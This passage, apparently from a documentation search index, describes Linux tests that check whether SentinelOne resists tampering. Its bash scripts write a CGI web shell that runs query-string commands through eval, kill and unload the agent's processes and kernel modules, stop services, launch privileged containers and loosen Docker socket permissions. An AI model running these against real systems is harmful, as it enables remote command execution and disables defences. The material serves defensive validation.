\ud83d\udee1\ufe0f","text":"<p>Konsep: Memvalidasi bahwa critical applications tetap terlindungi dan berjalan normal - Web Server: Apache/Nginx tetap serve traffic, tapi terlindungi dari web shell upload - Database: MySQL/PostgreSQL tetap accessible, tapi data directory terlindungi dari tampering - Containers: Docker/Podman tetap functional, tapi container escape di-prevent</p>"},{"location":"testing/linux/linux-overview/#3-threat-detection-testing","title":"3. Threat Detection Testing \ud83d\udea8","text":"<p>Konsep: Menguji kemampuan detection dalam Linux-specific attack vectors - Privilege Escalation: Sudo/SUID abuse detection - Container Escape: Breakout attempt dari container ke host - Rootkit Detection: Hidden process/file detection</p>"},{"location":"testing/linux/linux-overview/#linux-server-environment-focus","title":"\ud83d\udc27 Linux Server Environment Focus","text":""},{"location":"testing/linux/linux-overview/#target-distributions","title":"Target Distributions","text":"<ul> <li>Red Hat Enterprise Linux (RHEL 8/9)</li> <li>CentOS (7/8/Stream)</li> <li>Ubuntu Server (20.04 LTS, 22.04 LTS)</li> <li>SUSE Linux Enterprise Server (SLES 12/15)</li> <li>Debian (10/11/12)</li> <li>Amazon Linux (2/2023)</li> <li>Oracle Linux (8/9)</li> </ul>"},{"location":"testing/linux/linux-overview/#critical-linux-server-roles-apa-yang-akan-diproteksi","title":"Critical Linux Server Roles - Apa yang Akan Diproteksi?","text":""},{"location":"testing/linux/linux-overview/#web-server-protection-apachenginx","title":"\ud83c\udf10 Web Server Protection (Apache/Nginx)","text":"<p>Konsep: SentinelOne akan melindungi web server dari web shell upload, configuration tampering, dan service manipulation.</p> <pre><code>flowchart LR\n    subgraph \"Web Server Protection\"\n        A[Attacker] --&gt;|Upload Web Shell| WEB[Apache/Nginx]\n        A --&gt;|Modify Config| CONF[/etc/apache2/]\n        A --&gt;|Stop Service| SVC[systemctl stop apache2]\n\n        S1[SentinelOne Agent] --&gt;|Block Upload| WEB\n        S1 --&gt;|Protect Config| CONF  \n        S1 --&gt;|Prevent Stop| SVC\n    end\n\n    style S1 fill:#e8f5e8\n    style A fill:#ffebee</code></pre> <p>Yang Diuji: - \u2705 Web shell upload prevention ke <code>/var/www/html/</code> - \u2705 Configuration file protection (<code>/etc/apache2/</code>, <code>/etc/nginx/</code>) - \u2705 Service tampering prevention (<code>systemctl stop apache2</code>)</p>"},{"location":"testing/linux/linux-overview/#database-protection-mysqlpostgresql","title":"\ud83d\uddc4\ufe0f Database Protection (MySQL/PostgreSQL)","text":"<p>Konsep: Database server dan data directory harus terlindungi dari unauthorized access dan tampering.</p> <pre><code>flowchart TD\n    subgraph \"Database Protection\"\n        DB[\"MySQL/PostgreSQL Database\"]\n        DATA[\"/var/lib/mysql/ Data Directory\"]\n        SVC_DB[\"Database Service\"]\n\n        ATTACKER[\"Attacker\"] --&gt;|\"Access Data Files\"| DATA\n        ATTACKER --&gt;|\"Stop Service\"| SVC_DB\n        ATTACKER --&gt;|\"Dump Database\"| DB\n\n        SENTINEL[\"SentinelOne\"] --&gt;|\"Protect Files\"| DATA\n        SENTINEL --&gt;|\"Block Service Stop\"| SVC_DB\n        SENTINEL --&gt;|\"Monitor Access\"| DB\n    end\n\n    style SENTINEL fill:#e3f2fd\n    style ATTACKER fill:#ffcdd2</code></pre> <p>Yang Diuji: - \u2705 Database data directory protection (<code>/var/lib/mysql/</code>, <code>/var/lib/postgresql/</code>) - \u2705 Service stop prevention (<code>systemctl stop mysql</code>) - \u2705 Malicious file creation in data directory</p>"},{"location":"testing/linux/linux-overview/#container-runtime-protection-dockerpodman","title":"\ud83d\udc33 Container Runtime Protection (Docker/Podman)","text":"<p>Konsep: Container runtime harus terlindungi dari privileged container, container escape, dan Docker socket abuse.</p> <pre><code>flowchart TB\n    subgraph \"Container Security\"\n        HOST[\"Host System\"]\n        DOCKER[\"Docker Daemon\"]\n        CONTAINER[\"Container\"]\n        SOCKET[\"/var/run/docker.sock\"]\n\n        ATTACKER[\"Malicious Container\"] --&gt;|\"Escape to Host\"| HOST\n        ATTACKER --&gt;|\"Access Docker Socket\"| SOCKET\n        ATTACKER --&gt;|\"Run Privileged\"| CONTAINER\n\n        S1[\"SentinelOne Agent\"] --&gt;|\"Prevent Escape\"| HOST\n        S1 --&gt;|\"Protect Socket\"| SOCKET\n        S1 --&gt;|\"Block Privileged\"| CONTAINER\n        S1 --&gt;|\"Monitor Daemon\"| DOCKER\n    end\n\n    style S1 fill:#e8f5e8\n    style ATTACKER fill:#ffebee</code></pre> <p>Yang Diuji: - \u2705 Privileged container blocking (<code>docker run --privileged</code>) - \u2705 Host namespace access prevention (<code>--pid=host --net=host</code>) - \u2705 Docker socket permission protection (<code>chmod 777 /var/run/docker.sock</code>) - \u2705 Container escape attempt detection</p>"},{"location":"testing/linux/linux-overview/#ssh-server-protection","title":"\ud83d\udd10 SSH Server Protection","text":"<p>Konsep: SSH server harus dilindungi dari brute force attacks dan configuration tampering.</p>"},{"location":"testing/linux/linux-overview/#file-sharing-protection-nfssamba","title":"\ud83d\udcc1 File Sharing Protection (NFS/Samba)","text":"<p>Konsep: File sharing services harus terlindungi dari unauthorized access dan data exfiltration.</p>"},{"location":"testing/linux/linux-overview/#linux-specific-security-testing","title":"\ud83d\udd10 Linux-Specific Security Testing","text":""},{"location":"testing/linux/linux-overview/#system-level-security-integration-penjelasan-konsep","title":"System-Level Security Integration - Penjelasan Konsep","text":""},{"location":"testing/linux/linux-overview/#selinuxapparmor-integration","title":"\ud83d\udee1\ufe0f SELinux/AppArmor Integration","text":"<p>Konsep: SentinelOne agent harus dapat berjalan dalam Linux security framework (SELinux/AppArmor) tanpa conflict. Ini adalah Mandatory Access Control (MAC) system yang membatasi akses berdasarkan security policy.</p> <pre><code>flowchart TD\n    subgraph \"Linux Security Integration\"\n        KERNEL[\"Linux Kernel\"]\n\n        subgraph \"Security Modules\"\n            SEL[\"SELinux (RHEL/CentOS)\"]\n            APP[\"AppArmor (Ubuntu/Debian)\"]\n        end\n\n        subgraph \"SentinelOne Components\"\n            AGENT[\"SentinelOne Agent\"]\n            KMOD[\"Kernel Modules\"]\n            PROC[\"Agent Processes\"]\n        end\n\n        KERNEL --&gt; SEL\n        KERNEL --&gt; APP\n\n        SEL -.-&gt;|\"Security Context\"| AGENT\n        APP -.-&gt;|\"Profile Rules\"| AGENT\n\n        AGENT --&gt; KMOD\n        AGENT --&gt; PROC\n\n        subgraph \"Testing Scenarios\"\n            T1[\"Test: Agent dapat start dengan SELinux Enforcing\"]\n            T2[\"Test: File access sesuai dengan security context\"]\n            T3[\"Test: Process execution tidak blocked oleh policy\"]\n        end\n    end\n\n    style AGENT fill:#e1f5fe\n    style SEL fill:#fff3e0\n    style APP fill:#f3e5f5</code></pre> <p>Yang Akan Diuji: - \u2705 SELinux Compatibility: Agent berjalan normal dalam mode Enforcing - \u2705 Security Context: Process memiliki correct SELinux context - \u2705 File Access: Agent dapat akses file dengan proper permissions - \u2705 AppArmor Profile: Agent compliance dengan AppArmor rules - \u2705 Policy Integration: No violations dalam audit log</p> <p>Kenapa Penting? - Banyak enterprise Linux menggunakan SELinux (RHEL, CentOS) - Ubuntu server default menggunakan AppArmor - Security compliance requirement di enterprise environment - Jika agent blocked oleh MAC, protection akan gagal <pre><code>#!/bin/bash\necho \"=== LINUX SECURITY MODULE INTEGRATION TESTING ===\"\n\n# Check SELinux status (RHEL/CentOS)\nif command -v sestatus &amp;&gt; /dev/null; then\n    echo \"=== SELinux Status ===\"\n    sestatus\n\n    # Check SentinelOne SELinux context\n    if ps aux | grep -q sentinelone-agent; then\n        SENTINEL_PID=$(pidof sentinelone-agent)\n        echo \"SentinelOne process security context:\"\n        ps -eZ | grep sentinelone\n\n        # Test SELinux policy for SentinelOne\n        echo \"Testing SELinux policy compliance...\"\n        audit2why &lt; /var/log/audit/audit.log | grep -i sentinel\n\n        # Verify SentinelOne can operate under SELinux\n        if selinuxenabled; then\n            echo \"\u2705 SELinux enabled - testing SentinelOne compatibility\"\n\n            # Test file access under SELinux\n            sudo /opt/sentinelone/bin/sentinelctl status\n            if [ $? -eq 0 ]; then\n                echo \"\u2705 SentinelOne operates correctly under SELinux\"\n            else\n                echo \"\u274c SentinelOne blocked by SELinux\"\n            fi\n        fi\n    fi\nfi\n\n# Check AppArmor status (Ubuntu/Debian)\nif command -v aa-status &amp;&gt; /dev/null; then\n    echo \"=== AppArmor Status ===\"\n    sudo aa-status\n\n    # Check if SentinelOne has AppArmor profile\n    if [ -f \"/etc/apparmor.d/sentinelone\" ]; then\n        echo \"\u2705 SentinelOne AppArmor profile found\"\n        sudo aa-status | grep sentinelone\n    else\n        echo \"\u26aa No specific AppArmor profile for SentinelOne\"\n    fi\n\n    # Test AppArmor compliance\n    if systemctl is-active apparmor &amp;&gt; /dev/null; then\n        echo \"Testing SentinelOne under AppArmor...\"\n        sudo /opt/sentinelone/bin/sentinelctl status\n        if [ $? -eq 0 ]; then\n            echo \"\u2705 SentinelOne operates correctly under AppArmor\"\n        else\n            echo \"\u274c SentinelOne may be restricted by AppArmor\"\n        fi\n    fi\nfi\n</code></pre></p>"},{"location":"testing/linux/linux-overview/#kernel-module-protection","title":"Kernel Module Protection","text":"<pre><code>#!/bin/bash\necho \"=== KERNEL MODULE PROTECTION TESTING ===\"\n\n# Check loaded SentinelOne kernel modules\necho \"Checking SentinelOne kernel modules...\"\nSENTINEL_MODULES=$(lsmod | grep sentinelone)\nif [ -n \"$SENTINEL_MODULES\" ]; then\n    echo \"\u2705 SentinelOne kernel modules loaded:\"\n    echo \"$SENTINEL_MODULES\"\n\n    # Test kernel module protection\n    for module in $(echo \"$SENTINEL_MODULES\" | awk '{print $1}'); do\n        echo \"Testing protection for module: $module\"\n\n        # Attempt to remove module\n        echo \"Attempting to remove kernel module $module...\"\n        sudo rmmod \"$module\" 2&gt;&amp;1\n\n        # Check if module still loaded\n        if lsmod | grep -q \"$module\"; then\n            echo \"\u2705 Kernel module $module protected from removal\"\n        else\n            echo \"\u274c CRITICAL: Kernel module $module was removed!\"\n        fi\n    done\n\n    # Test malicious module loading prevention\n    echo \"Testing malicious module loading prevention...\"\n\n    # Create a test module (non-malicious)\n    cat &gt; /tmp/test_module.c &lt;&lt; 'EOF'\n#include &lt;linux/init.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;linux/kernel.h&gt;\n\nstatic int __init test_init(void) {\n    printk(KERN_INFO \"Test module loaded\\n\");\n    return 0;\n}\n\nstatic void __exit test_exit(void) {\n    printk(KERN_INFO \"Test module unloaded\\n\");\n}\n\nmodule_init(test_init);\nmodule_exit(test_exit);\nMODULE_LICENSE(\"GPL\");\nMODULE_DESCRIPTION(\"Test module\");\nEOF\n\n    # Attempt to compile and load (should be blocked by SentinelOne)\n    if command -v make &amp;&gt; /dev/null &amp;&amp; [ -d \"/lib/modules/$(uname -r)/build\" ]; then\n        cd /tmp\n        echo 'obj-m += test_module.o' &gt; Makefile\n        make -C \"/lib/modules/$(uname -r)/build\" M=/tmp modules &amp;&gt; /dev/null\n\n        if [ -f \"test_module.ko\" ]; then\n            sudo insmod test_module.ko 2&gt;&amp;1\n            if lsmod | grep -q \"test_module\"; then\n                echo \"\u274c Unauthorized module loading succeeded\"\n                sudo rmmod test_module\n            else\n                echo \"\u2705 Unauthorized module loading blocked\"\n            fi\n            rm -f test_module.ko test_module.o test_module.mod.* modules.order Module.symvers .test_module.*\n        fi\n        rm -f Makefile test_module.c\n        cd - &gt; /dev/null\n    fi\nelse\n    echo \"\u26aa No SentinelOne kernel modules detected\"\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#process-protection-anti-tampering","title":"Process Protection &amp; Anti-Tampering","text":"<pre><code>#!/bin/bash\necho \"=== PROCESS PROTECTION TESTING ===\"\n\n# Find SentinelOne processes\nSENTINEL_PIDS=($(pgrep -f sentinelone))\n\nif [ ${#SENTINEL_PIDS[@]} -gt 0 ]; then\n    echo \"\u2705 SentinelOne processes found: ${SENTINEL_PIDS[*]}\"\n\n    for pid in \"${SENTINEL_PIDS[@]}\"; do\n        echo \"Testing protection for PID: $pid\"\n\n        # Get process name\n        PROCESS_NAME=$(ps -p $pid -o comm=)\n        echo \"Process: $PROCESS_NAME\"\n\n        # Test SIGTERM\n        echo \"Testing SIGTERM signal...\"\n        sudo kill -TERM $pid\n        sleep 2\n        if kill -0 $pid 2&gt;/dev/null; then\n            echo \"\u2705 Process survived SIGTERM\"\n        else\n            echo \"\u274c Process terminated by SIGTERM\"\n        fi\n\n        # Test SIGKILL\n        echo \"Testing SIGKILL signal...\"\n        sudo kill -9 $pid\n        sleep 2\n        if kill -0 $pid 2&gt;/dev/null; then\n            echo \"\u2705 Process survived SIGKILL\"\n        else\n            echo \"\u274c Process terminated by SIGKILL\"\n        fi\n\n        # Test process freezing (SIGSTOP)\n        echo \"Testing process freezing...\"\n        sudo kill -STOP $pid\n        sleep 1\n\n        # Check if process is still responsive\n        sudo kill -CONT $pid\n        if kill -0 $pid 2&gt;/dev/null; then\n            echo \"\u2705 Process resumed after freeze attempt\"\n        else\n            echo \"\u274c Process killed during freeze test\"\n        fi\n\n        # Test ptrace attachment\n        echo \"Testing ptrace protection...\"\n        gdb -p $pid -batch -ex \"quit\" 2&gt;&amp;1 | grep -q \"Operation not permitted\"\n        if [ $? -eq 0 ]; then\n            echo \"\u2705 Process protected from ptrace\"\n        else\n            echo \"\u274c Process vulnerable to ptrace\"\n        fi\n\n        echo \"---\"\n    done\nelse\n    echo \"\u274c No SentinelOne processes found!\"\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#linux-server-application-testing","title":"\ud83d\ude80 Linux Server Application Testing","text":""},{"location":"testing/linux/linux-overview/#apache-http-server-protection","title":"Apache HTTP Server Protection","text":"<pre><code>#!/bin/bash\necho \"=== APACHE HTTP SERVER PROTECTION TESTING ===\"\n\n# Check if Apache is running\nif systemctl is-active httpd &amp;&gt; /dev/null || systemctl is-active apache2 &amp;&gt; /dev/null; then\n    echo \"\u2705 Apache HTTP Server detected\"\n\n    # Detect Apache service name\n    if systemctl is-active httpd &amp;&gt; /dev/null; then\n        APACHE_SERVICE=\"httpd\"\n        APACHE_CONFIG_DIR=\"/etc/httpd\"\n        APACHE_WEB_ROOT=\"/var/www/html\"\n    else\n        APACHE_SERVICE=\"apache2\"\n        APACHE_CONFIG_DIR=\"/etc/apache2\"\n        APACHE_WEB_ROOT=\"/var/www/html\"\n    fi\n\n    echo \"Apache service: $APACHE_SERVICE\"\n\n    # Test web shell upload protection\n    echo \"Testing web shell upload protection...\"\n    WEB_SHELL_CONTENT='#!/bin/bash\necho \"Content-Type: text/html\"\necho \"\"\nif [ -n \"$QUERY_STRING\" ]; then\n    cmd=$(echo \"$QUERY_STRING\" | sed \"s/cmd=//\")\n    echo \"&lt;pre&gt;\"\n    eval \"$cmd\" 2&gt;&amp;1\n    echo \"&lt;/pre&gt;\"\nfi'\n\n    # Attempt to create web shell\n    try_create_webshell() {\n        local shell_path=\"$1\"\n        echo \"$WEB_SHELL_CONTENT\" &gt; \"$shell_path\" 2&gt;/dev/null\n        chmod +x \"$shell_path\" 2&gt;/dev/null\n\n        if [ -f \"$shell_path\" ]; then\n            echo \"\u274c Web shell created at $shell_path - SECURITY RISK!\"\n            rm -f \"$shell_path\"\n            return 1\n        else\n            echo \"\u2705 Web shell creation blocked\"\n            return 0\n        fi\n    }\n\n    # Test in various locations\n    try_create_webshell \"$APACHE_WEB_ROOT/shell.cgi\"\n    try_create_webshell \"/tmp/apache_shell.sh\"\n\n    # Test Apache configuration tampering\n    echo \"Testing Apache configuration protection...\"\n    CONFIG_FILE=\"$APACHE_CONFIG_DIR/conf.d/test_config.conf\"\n\n    echo \"# Test configuration\" &gt; \"$CONFIG_FILE\" 2&gt;/dev/null\n    if [ -f \"$CONFIG_FILE\" ]; then\n        echo \"\u274c Apache configuration modification succeeded\"\n        rm -f \"$CONFIG_FILE\"\n    else\n        echo \"\u2705 Apache configuration modification blocked\"\n    fi\n\n    # Test Apache service tampering\n    echo \"Testing Apache service protection...\"\n    systemctl stop $APACHE_SERVICE 2&gt;&amp;1 | grep -q \"Failed\"\n    if [ $? -eq 0 ]; then\n        echo \"\u2705 Apache service stop blocked\"\n    else\n        if systemctl is-active $APACHE_SERVICE &amp;&gt; /dev/null; then\n            echo \"\u2705 Apache service still running\"\n        else\n            echo \"\u274c Apache service was stopped\"\n            systemctl start $APACHE_SERVICE\n        fi\n    fi\n\nelse\n    echo \"\u26aa Apache HTTP Server not detected\"\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#database-server-protection","title":"Database Server Protection","text":"<pre><code>#!/bin/bash\necho \"=== DATABASE SERVER PROTECTION TESTING ===\"\n\n# Test MySQL/MariaDB protection\nif systemctl is-active mysql &amp;&gt; /dev/null || systemctl is-active mariadb &amp;&gt; /dev/null; then\n    echo \"\u2705 MySQL/MariaDB detected\"\n\n    # Determine service name\n    if systemctl is-active mysql &amp;&gt; /dev/null; then\n        DB_SERVICE=\"mysql\"\n    else\n        DB_SERVICE=\"mariadb\"\n    fi\n\n    echo \"Database service: $DB_SERVICE\"\n\n    # Test database service protection\n    echo \"Testing database service protection...\"\n    systemctl stop $DB_SERVICE 2&gt;&amp;1 | grep -q \"Failed\"\n    if [ $? -eq 0 ]; then\n        echo \"\u2705 Database service stop blocked\"\n    else\n        if systemctl is-active $DB_SERVICE &amp;&gt; /dev/null; then\n            echo \"\u2705 Database service still running\"\n        else\n            echo \"\u274c Database service was stopped\"\n            systemctl start $DB_SERVICE\n        fi\n    fi\n\n    # Test database file protection\n    echo \"Testing database file protection...\"\n    DB_DATA_DIRS=(\"/var/lib/mysql\" \"/var/lib/mariadb\")\n\n    for dir in \"${DB_DATA_DIRS[@]}\"; do\n        if [ -d \"$dir\" ]; then\n            echo \"Testing access to database directory: $dir\"\n\n            # Try to create malicious file in database directory\n            MALICIOUS_FILE=\"$dir/malicious_test.txt\"\n            echo \"malicious content\" &gt; \"$MALICIOUS_FILE\" 2&gt;/dev/null\n\n            if [ -f \"$MALICIOUS_FILE\" ]; then\n                echo \"\u274c File creation in database directory succeeded\"\n                rm -f \"$MALICIOUS_FILE\"\n            else\n                echo \"\u2705 Database directory protected\"\n            fi\n        fi\n    done\nfi\n\n# Test PostgreSQL protection\nif systemctl is-active postgresql &amp;&gt; /dev/null; then\n    echo \"\u2705 PostgreSQL detected\"\n\n    # Test PostgreSQL service protection\n    echo \"Testing PostgreSQL service protection...\"\n    systemctl stop postgresql 2&gt;&amp;1 | grep -q \"Failed\"\n    if [ $? -eq 0 ]; then\n        echo \"\u2705 PostgreSQL service stop blocked\"\n    else\n        if systemctl is-active postgresql &amp;&gt; /dev/null; then\n            echo \"\u2705 PostgreSQL service still running\"\n        else\n            echo \"\u274c PostgreSQL service was stopped\"\n            systemctl start postgresql\n        fi\n    fi\n\n    # Test PostgreSQL data directory protection\n    PG_DATA_DIRS=(\"/var/lib/postgresql\" \"/var/lib/pgsql\")\n\n    for dir in \"${PG_DATA_DIRS[@]}\"; do\n        if [ -d \"$dir\" ]; then\n            echo \"Testing PostgreSQL data directory: $dir\"\n\n            MALICIOUS_FILE=\"$dir/malicious_test.txt\"\n            echo \"malicious content\" &gt; \"$MALICIOUS_FILE\" 2&gt;/dev/null\n\n            if [ -f \"$MALICIOUS_FILE\" ]; then\n                echo \"\u274c File creation in PostgreSQL directory succeeded\"\n                rm -f \"$MALICIOUS_FILE\"\n            else\n                echo \"\u2705 PostgreSQL directory protected\"\n            fi\n        fi\n    done\nfi\n\nif ! systemctl is-active mysql &amp;&gt; /dev/null &amp;&amp; ! systemctl is-active mariadb &amp;&gt; /dev/null &amp;&amp; ! systemctl is-active postgresql &amp;&gt; /dev/null; then\n    echo \"\u26aa No database servers detected\"\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#container-runtime-protection","title":"Container Runtime Protection","text":"<pre><code>#!/bin/bash\necho \"=== CONTAINER RUNTIME PROTECTION TESTING ===\"\n\n# Test Docker protection\nif command -v docker &amp;&gt; /dev/null &amp;&amp; systemctl is-active docker &amp;&gt; /dev/null; then\n    echo \"\u2705 Docker detected and running\"\n\n    # Test Docker daemon protection\n    echo \"Testing Docker daemon protection...\"\n    systemctl stop docker 2&gt;&amp;1 | grep -q \"Failed\"\n    if [ $? -eq 0 ]; then\n        echo \"\u2705 Docker daemon stop blocked\"\n    else\n        if systemctl is-active docker &amp;&gt; /dev/null; then\n            echo \"\u2705 Docker daemon still running\"\n        else\n            echo \"\u274c Docker daemon was stopped\"\n            systemctl start docker\n        fi\n    fi\n\n    # Test malicious container detection\n    echo \"Testing malicious container detection...\"\n\n    # Try to run privileged container\n    docker run --rm --privileged -d alpine:latest sleep 60 &amp;&gt; /dev/null\n    if [ $? -eq 0 ]; then\n        echo \"\u274c Privileged container started - potential security risk\"\n        docker kill $(docker ps -q --filter ancestor=alpine:latest) &amp;&gt; /dev/null\n    else\n        echo \"\u2705 Privileged container blocked\"\n    fi\n\n    # Test host namespace access\n    docker run --rm --pid=host --net=host -d alpine:latest sleep 60 &amp;&gt; /dev/null\n    if [ $? -eq 0 ]; then\n        echo \"\u274c Host namespace access allowed - security risk\"\n        docker kill $(docker ps -q --filter ancestor=alpine:latest) &amp;&gt; /dev/null\n    else\n        echo \"\u2705 Host namespace access blocked\"\n    fi\n\n    # Test Docker socket access\n    echo \"Testing Docker socket protection...\"\n    if [ -S \"/var/run/docker.sock\" ]; then\n        ls -la /var/run/docker.sock\n\n        # Test unauthorized access to Docker socket\n        chmod 777 /var/run/docker.sock 2&gt;/dev/null\n        if [ $? -eq 0 ]; then\n            echo \"\u274c Docker socket permissions modified\"\n            chmod 660 /var/run/docker.sock\n        else\n            echo \"\u2705 Docker socket permissions protected\"\n        fi\n    fi\nfi\n\n# Test Podman protection (if available)\nif command -v podman &amp;&gt; /dev/null; then\n    echo \"\u2705 Podman detected\"\n\n    # Test similar scenarios with Podman\n    echo \"Testing Podman container restrictions...\"\n\n    podman run --rm --privileged -d alpine:latest sleep 60 &amp;&gt; /dev/null\n    if [ $? -eq 0 ]; then\n        echo \"\u274c Privileged Podman container started\"\n        podman kill $(podman ps -q --filter ancestor=alpine:latest) &amp;&gt; /dev/null\n    else\n        echo \"\u2705 Privileged Podman container blocked\"\n    fi\nfi\n\nif ! command -v docker &amp;&gt; /dev/null &amp;&amp; ! command -v podman &amp;&gt; /dev/null; then\n    echo \"\u26aa No container runtime detected\"\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#linux-system-monitoring-integration","title":"\ud83d\udd0d Linux System Monitoring Integration","text":""},{"location":"testing/linux/linux-overview/#systemd-journal-integration","title":"Systemd Journal Integration","text":"<pre><code>#!/bin/bash\necho \"=== SYSTEMD JOURNAL INTEGRATION TESTING ===\"\n\n# Check systemd and journal status\nif systemctl --version &amp;&gt; /dev/null; then\n    echo \"\u2705 systemd detected\"\n\n    # Check journal service\n    if systemctl is-active systemd-journald &amp;&gt; /dev/null; then\n        echo \"\u2705 systemd-journald is active\"\n\n        # Generate test events\n        logger -p local0.info \"SentinelOne integration test - $(date)\"\n\n        # Check if SentinelOne events are in journal\n        echo \"Checking for SentinelOne events in journal...\"\n        journalctl -u sentinelone* --since \"1 minute ago\" --no-pager\n\n        # Test journal forwarding\n        echo \"Testing journal log forwarding...\"\n        RECENT_ENTRIES=$(journalctl --since \"1 minute ago\" -o json | grep -c \"SentinelOne\")\n\n        if [ \"$RECENT_ENTRIES\" -gt 0 ]; then\n            echo \"\u2705 SentinelOne events found in journal\"\n        else\n            echo \"\u26aa No recent SentinelOne events in journal\"\n        fi\n\n        # Test journal storage protection\n        echo \"Testing journal file protection...\"\n        JOURNAL_DIR=\"/var/log/journal\"\n        if [ -d \"$JOURNAL_DIR\" ]; then\n            TEST_FILE=\"$JOURNAL_DIR/malicious_test\"\n            echo \"test\" &gt; \"$TEST_FILE\" 2&gt;/dev/null\n\n            if [ -f \"$TEST_FILE\" ]; then\n                echo \"\u274c Journal directory modification succeeded\"\n                rm -f \"$TEST_FILE\"\n            else\n                echo \"\u2705 Journal directory protected\"\n            fi\n        fi\n    fi\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#syslog-integration","title":"Syslog Integration","text":"<pre><code>#!/bin/bash\necho \"=== SYSLOG INTEGRATION TESTING ===\"\n\n# Check for syslog implementations\nSYSLOG_SERVICES=(\"rsyslog\" \"syslog-ng\" \"systemd-journald\")\nACTIVE_SYSLOG=\"\"\n\nfor service in \"${SYSLOG_SERVICES[@]}\"; do\n    if systemctl is-active \"$service\" &amp;&gt; /dev/null; then\n        ACTIVE_SYSLOG=\"$service\"\n        echo \"\u2705 $service is active\"\n        break\n    fi\ndone\n\nif [ -n \"$ACTIVE_SYSLOG\" ]; then\n    # Test syslog message generation\n    echo \"Testing syslog message generation...\"\n    logger -p daemon.info \"SentinelOne syslog integration test - $(date)\"\n\n    # Check if message appears in logs\n    sleep 2\n    if grep -q \"SentinelOne syslog integration test\" /var/log/messages 2&gt;/dev/null || \\\n       grep -q \"SentinelOne syslog integration test\" /var/log/syslog 2&gt;/dev/null; then\n        echo \"\u2705 Syslog message logged successfully\"\n    else\n        echo \"\u26aa Syslog message not found in standard locations\"\n    fi\n\n    # Test SentinelOne syslog configuration protection\n    SYSLOG_CONFIGS=(\"/etc/rsyslog.conf\" \"/etc/rsyslog.d/\" \"/etc/syslog-ng/\")\n\n    for config in \"${SYSLOG_CONFIGS[@]}\"; do\n        if [ -e \"$config\" ]; then\n            echo \"Testing syslog configuration protection: $config\"\n\n            if [ -f \"$config\" ]; then\n                # Test file modification\n                echo \"# Test modification\" &gt;&gt; \"$config\" 2&gt;/dev/null\n                if grep -q \"Test modification\" \"$config\" 2&gt;/dev/null; then\n                    echo \"\u274c Syslog configuration modified\"\n                    # Remove test line\n                    sed -i '/# Test modification/d' \"$config\" 2&gt;/dev/null\n                else\n                    echo \"\u2705 Syslog configuration protected\"\n                fi\n            elif [ -d \"$config\" ]; then\n                # Test directory modification\n                TEST_CONF=\"$config/malicious_test.conf\"\n                echo \"# Malicious config\" &gt; \"$TEST_CONF\" 2&gt;/dev/null\n                if [ -f \"$TEST_CONF\" ]; then\n                    echo \"\u274c Syslog configuration directory modified\"\n                    rm -f \"$TEST_CONF\"\n                else\n                    echo \"\u2705 Syslog configuration directory protected\"\n                fi\n            fi\n        fi\n    done\nelse\n    echo \"\u274c No active syslog service found\"\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#linux-specific-attack-simulations","title":"\ud83e\uddea Linux-Specific Attack Simulations","text":""},{"location":"testing/linux/linux-overview/#privilege-escalation-testing","title":"Privilege Escalation Testing","text":"<pre><code>#!/bin/bash\necho \"=== PRIVILEGE ESCALATION TESTING ===\"\n\n# Test sudo privilege escalation\necho \"Testing sudo privilege escalation...\"\n\n# Check for common sudo vulnerabilities\necho \"Checking sudo version...\"\nsudo --version | head -1\n\n# Test SUID binary enumeration and abuse\necho \"Testing SUID binary protection...\"\nSUID_BINARIES=$(find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2&gt;/dev/null | head -10)\n\necho \"Found SUID binaries:\"\necho \"$SUID_BINARIES\"\n\n# Test common SUID escalation vectors\nfor binary in $SUID_BINARIES; do\n    case \"$(basename $binary)\" in\n        \"vim\"|\"nano\"|\"less\"|\"more\")\n            echo \"Testing SUID abuse with $(basename $binary)...\"\n            # Test if these can be used for privilege escalation\n            # This is a safe test that doesn't actually escalate\n            if [ -u \"$binary\" ]; then\n                echo \"\u26a0\ufe0f  SUID bit set on $(basename $binary) - potential escalation vector\"\n            fi\n            ;;\n    esac\ndone\n\n# Test kernel exploit protection\necho \"Testing kernel exploit protection...\"\necho \"Kernel version: $(uname -r)\"\n\n# Test /proc/sys/kernel protections\nif [ -f \"/proc/sys/kernel/dmesg_restrict\" ]; then\n    DMESG_RESTRICT=$(cat /proc/sys/kernel/dmesg_restrict)\n    echo \"dmesg restriction: $DMESG_RESTRICT\"\nfi\n\nif [ -f \"/proc/sys/kernel/kptr_restrict\" ]; then\n    KPTR_RESTRICT=$(cat /proc/sys/kernel/kptr_restrict)\n    echo \"Kernel pointer restriction: $KPTR_RESTRICT\"\nfi\n\n# Test capability-based attacks\necho \"Testing capability restrictions...\"\nwhich getcap &amp;&gt; /dev/null &amp;&amp; getcap -r /usr/bin /usr/sbin 2&gt;/dev/null | head -5\n</code></pre>"},{"location":"testing/linux/linux-overview/#container-escape-testing","title":"Container Escape Testing","text":"<pre><code>#!/bin/bash\necho \"=== CONTAINER ESCAPE TESTING ===\"\n\n# Check if running in container\nif [ -f \"/.dockerenv\" ] || grep -q \"docker\\|lxc\\|container\" /proc/1/cgroup 2&gt;/dev/null; then\n    echo \"\u26a0\ufe0f  Running inside container - testing escape prevention\"\n\n    # Test common container escape techniques\n    echo \"Testing container escape techniques...\"\n\n    # Test host filesystem access\n    echo \"Testing host filesystem access...\"\n    if [ -d \"/host\" ] || [ -d \"/mnt/host\" ]; then\n        echo \"\u274c Host filesystem potentially accessible\"\n    else\n        echo \"\u2705 Host filesystem not accessible\"\n    fi\n\n    # Test Docker socket access\n    if [ -S \"/var/run/docker.sock\" ]; then\n        echo \"\u274c Docker socket accessible from container - CRITICAL RISK\"\n    else\n        echo \"\u2705 Docker socket not accessible\"\n    fi\n\n    # Test privileged capabilities\n    echo \"Testing container capabilities...\"\n    if command -v capsh &amp;&gt; /dev/null; then\n        capsh --print\n    else\n        cat /proc/self/status | grep Cap\n    fi\n\n    # Test procfs restrictions\n    echo \"Testing procfs access restrictions...\"\n    if [ -r \"/proc/1/environ\" ]; then\n        echo \"\u274c Host process information accessible\"\n    else\n        echo \"\u2705 Host process information protected\"\n    fi\n\nelse\n    echo \"\u26aa Not running in container - 